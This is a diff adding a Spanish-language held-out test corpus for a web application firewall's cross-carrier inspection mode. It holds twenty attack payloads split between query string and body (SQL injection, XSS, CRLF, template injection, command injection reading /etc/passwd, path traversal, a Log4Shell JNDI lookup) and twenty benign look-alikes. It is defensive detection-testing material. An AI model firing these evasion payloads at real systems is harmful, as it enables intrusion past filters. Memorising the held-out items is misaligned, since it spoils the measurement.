@@ -1,0 +1,350 @@
+{
+  "description": "Corpus RETENIDO del modo opt-in inspect_cross_carrier=True. Se usa para medir, no para ajustar. Separate de corpus/cross.json (que es de desarrollo). Ver corpus/HELDOUT.md.",
+  "provenance": "Payloads redactados para este proyecto: firmas PARTIDAS entre la ruta/query y los valores textuales del body. Escritos sin consultar las firmas de las reglas, pensando en la tecnica (que se puede repartir la firma entre dos transportadores) y no en el patron exacto.",
+  "held_out": true,
+  "rules_frozen_at": "v0.3.1",
+  "payloads": [
+    {
+      "id": "hoc-atk-001",
+      "expect": "attack",
+      "rule": "sqli",
+      "target": "/buscar?q=UNION",
+      "body": "SELECT id FROM accounts",
+      "content_type": "text/plain",
+      "note": "UNION en la query, SELECT en el body"
+    },
+    {
+      "id": "hoc-atk-002",
+      "expect": "attack",
+      "rule": "sqli",
+      "target": "/api/rows?sort=UNION",
+      "body": "ALL SELECT NULL, NULL, version()",
+      "content_type": "text/plain",
+      "note": "UNION ALL SELECT repartido"
+    },
+    {
+      "id": "hoc-atk-003",
+      "expect": "attack",
+      "rule": "sqli",
+      "target": "/x?f=union",
+      "body": "select secret from vault",
+      "content_type": "text/plain",
+      "note": "minusculas en ambos lados"
+    },
+    {
+      "id": "hoc-atk-004",
+      "expect": "attack",
+      "rule": "sqli",
+      "target": "/x?id=UNION",
+      "body": "{\"cols\": \"SELECT user, pass FROM users\"}",
+      "content_type": "application/json",
+      "note": "SELECT en un valor JSON"
+    },
+    {
+      "id": "hoc-atk-005",
+      "expect": "attack",
+      "rule": "sqli",
+      "target": "/x?q=UNION%20SELECT",
+      "body": "NULL, NULL",
+      "content_type": "application/json",
+      "note": "la parte clave en la query, las columnas en el body"
+    },
+    {
+      "id": "hoc-atk-006",
+      "expect": "attack",
+      "rule": "sqli",
+      "target": "/x?a=1&b=UNION",
+      "body": "q=SELECT id FROM information_schema.tables",
+      "content_type": "application/x-www-form-urlencoded",
+      "note": "UNION en la query, SELECT en el valor de un form"
+    },
+    {
+      "id": "hoc-atk-007",
+      "expect": "attack",
+      "rule": "sqli",
+      "target": "/x?filter=UNION",
+      "body": "{\"a\": \"SELECT\"}",
+      "content_type": "application/json",
+      "note": "SELECT en una clave JSON"
+    },
+    {
+      "id": "hoc-atk-008",
+      "expect": "attack",
+      "rule": "nosql",
+      "target": "/users?u=$ne",
+      "body": "{\"pwd\": \"$where\"}",
+      "content_type": "application/json",
+      "note": "operadores NoSQL repartidos"
+    },
+    {
+      "id": "hoc-atk-009",
+      "expect": "attack",
+      "rule": "nosql",
+      "target": "/users?q=$nin",
+      "body": "{\"a\": 1, \"b\": \"$regex\"}",
+      "content_type": "application/json",
+      "note": "$nin en la query, $regex en el body"
+    },
+    {
+      "id": "hoc-atk-010",
+      "expect": "attack",
+      "rule": "crlf",
+      "target": "/x?name=%0d%0a",
+      "body": "Set-Cookie: session=abc",
+      "content_type": "text/plain",
+      "note": "CRLF partido: la mitad en la query, la cabecera en el body"
+    },
+    {
+      "id": "hoc-atk-011",
+      "expect": "attack",
+      "rule": "crlf",
+      "target": "/x?q=a%0d%0a",
+      "body": "Location: https://otro.example",
+      "content_type": "text/plain",
+      "note": "CRLF con redireccion repartida"
+    },
+    {
+      "id": "hoc-atk-012",
+      "expect": "attack",
+      "rule": "xss",
+      "target": "/x?q=%3Cscript%3E",
+      "body": "alert(1)</script>",
+      "content_type": "text/plain",
+      "note": "etiqueta abierta en la query, cerrada en el body"
+    },
+    {
+      "id": "hoc-atk-013",
+      "expect": "attack",
+      "rule": "xss",
+      "target": "/x?q=%3Cimg%20src%3Dx%20",
+      "body": "onerror=alert(1)",
+      "content_type": "text/plain",
+      "note": "atributo handler partido"
+    },
+    {
+      "id": "hoc-atk-014",
+      "expect": "attack",
+      "rule": "ssti",
+      "target": "/x?t={{",
+      "body": "7*7}}",
+      "content_type": "text/plain",
+      "note": "plantilla partida entre query y body"
+    },
+    {
+      "id": "hoc-atk-015",
+      "expect": "attack",
+      "rule": "cmdi",
+      "target": "/x?q=%3B",
+      "body": "cat /etc/passwd",
+      "content_type": "text/plain",
+      "note": "separador de shell en la query, binario en el body"
+    },
+    {
+      "id": "hoc-atk-016",
+      "expect": "attack",
+      "rule": "sqli",
+      "target": "/x?a=1%20OR%20",
+      "body": "1=1",
+      "content_type": "text/plain",
+      "note": "tautologia partida por el espacio"
+    },
+    {
+      "id": "hoc-atk-017",
+      "expect": "attack",
+      "rule": "sqli",
+      "target": "/x?q=1%27%20",
+      "body": "UNION SELECT p FROM u",
+      "content_type": "application/json",
+      "note": "cierre de comilla en la query, UNION en el body"
+    },
+    {
+      "id": "hoc-atk-018",
+      "expect": "attack",
+      "rule": "path_traversal",
+      "target": "/files?path=..",
+      "body": "/../etc/passwd",
+      "content_type": "text/plain",
+      "note": "escalada partida entre query y body"
+    },
+    {
+      "id": "hoc-atk-019",
+      "expect": "attack",
+      "rule": "log4shell",
+      "target": "/x?u=${jndi:",
+      "body": "ldap://10.0.0.1/a}",
+      "content_type": "text/plain",
+      "note": "lookup JNDI partido"
+    },
+    {
+      "id": "hoc-atk-020",
+      "expect": "attack",
+      "rule": "sqli",
+      "target": "/x?q=ORDER%20BY",
+      "body": "10-- -",
+      "content_type": "text/plain",
+      "note": "sondeo de columnas partido"
+    }
+  ],
+  "benign_payloads": [
+    {
+      "id": "hoc-ben-001",
+      "expect": "benign",
+      "target": "/buscar?q=union",
+      "body": "de trenes austria",
+      "content_type": "text/plain",
+      "note": "union en la query y palabra normal en el body"
+    },
+    {
+      "id": "hoc-ben-002",
+      "expect": "benign",
+      "target": "/buscar?q=select",
+      "body": "de producto en el catalogo",
+      "content_type": "text/plain",
+      "note": "select en la query y en el body"
+    },
+    {
+      "id": "hoc-ben-003",
+      "expect": "benign",
+      "target": "/api?order=asc",
+      "body": "name, price, stock",
+      "content_type": "application/json",
+      "note": "orden y lista de campos"
+    },
+    {
+      "id": "hoc-ben-004",
+      "expect": "benign",
+      "target": "/api?q=libros",
+      "body": "{\"titulo\": \"El principito\", \"autor\": \"Saint-Exupery\"}",
+      "content_type": "application/json",
+      "note": "libro en JSON"
+    },
+    {
+      "id": "hoc-ben-005",
+      "expect": "benign",
+      "target": "/notas?q=set",
+      "body": "Cookie: la configuracion de la sesion",
+      "content_type": "text/plain",
+      "note": "palabras que parecen cabeceras en prosa"
+    },
+    {
+      "id": "hoc-ben-006",
+      "expect": "benign",
+      "target": "/notas?q=location",
+      "body": "redirect: ver la ubicacion del almacen",
+      "content_type": "text/plain",
+      "note": "location en prosa"
+    },
+    {
+      "id": "hoc-ben-007",
+      "expect": "benign",
+      "target": "/notas?q=template",
+      "body": "la plantilla base del proyecto",
+      "content_type": "text/plain",
+      "note": "template en prosa"
+    },
+    {
+      "id": "hoc-ben-008",
+      "expect": "benign",
+      "target": "/api?sort=name",
+      "body": "{\"total\": 42, \"page\": 1}",
+      "content_type": "application/json",
+      "note": "respuesta JSON normal"
+    },
+    {
+      "id": "hoc-ben-009",
+      "expect": "benign",
+      "target": "/form?action=save",
+      "body": "nombre=Ana&ciudad=Madrid",
+      "content_type": "application/x-www-form-urlencoded",
+      "note": "formulario legitimo"
+    },
+    {
+      "id": "hoc-ben-010",
+      "expect": "benign",
+      "target": "/docs?q=api",
+      "body": "{\"version\": \"1.0\", \"paths\": {\"/health\": {}}}",
+      "content_type": "application/json",
+      "note": "respuesta estilo OpenAPI"
+    },
+    {
+      "id": "hoc-ben-011",
+      "expect": "benign",
+      "target": "/blog?etiqueta=union",
+      "body": "europea 2026",
+      "content_type": "text/plain",
+      "note": "union en contexto natural"
+    },
+    {
+      "id": "hoc-ben-012",
+      "expect": "benign",
+      "target": "/blog?q=order",
+      "body": "by email",
+      "content_type": "text/plain",
+      "note": "order by repartido pero legitimo"
+    },
+    {
+      "id": "hoc-ben-013",
+      "expect": "benign",
+      "target": "/api?q=precio",
+      "body": "{\"min\": 10, \"max\": 100}",
+      "content_type": "application/json",
+      "note": "rango en JSON"
+    },
+    {
+      "id": "hoc-ben-014",
+      "expect": "benign",
+      "target": "/search?q=union+station",
+      "body": "opening hours",
+      "content_type": "text/plain",
+      "note": "estacion de tren"
+    },
+    {
+      "id": "hoc-ben-015",
+      "expect": "benign",
+      "target": "/files?path=docs",
+      "body": "readme.md",
+      "content_type": "text/plain",
+      "note": "ruta de fichero normal"
+    },
+    {
+      "id": "hoc-ben-016",
+      "expect": "benign",
+      "target": "/notas?q=script",
+      "body": "de ventas en javascript",
+      "content_type": "text/plain",
+      "note": "script en prosa"
+    },
+    {
+      "id": "hoc-ben-017",
+      "expect": "benign",
+      "target": "/notas?q=cat",
+      "body": "archivos comprimidos",
+      "content_type": "text/plain",
+      "note": "cat en contexto natural"
+    },
+    {
+      "id": "hoc-ben-018",
+      "expect": "benign",
+      "target": "/api?q=items",
+      "body": "{\"items\": [{\"id\": 1, \"name\": \"uno\"}]}",
+      "content_type": "application/json",
+      "note": "lista JSON"
+    },
+    {
+      "id": "hoc-ben-019",
+      "expect": "benign",
+      "target": "/api?q=users",
+      "body": "{\"users\": [{\"name\": \"Ana\", \"email\": \"ana@example.com\"}]}",
+      "content_type": "application/json",
+      "note": "lista de usuarios"
+    },
+    {
+      "id": "hoc-ben-020",
+      "expect": "benign",
+      "target": "/login?next=/panel",
+      "body": "{\"ok\": true}",
+      "content_type": "application/json",
+      "note": "login normal"
+    }
+  ]
+}
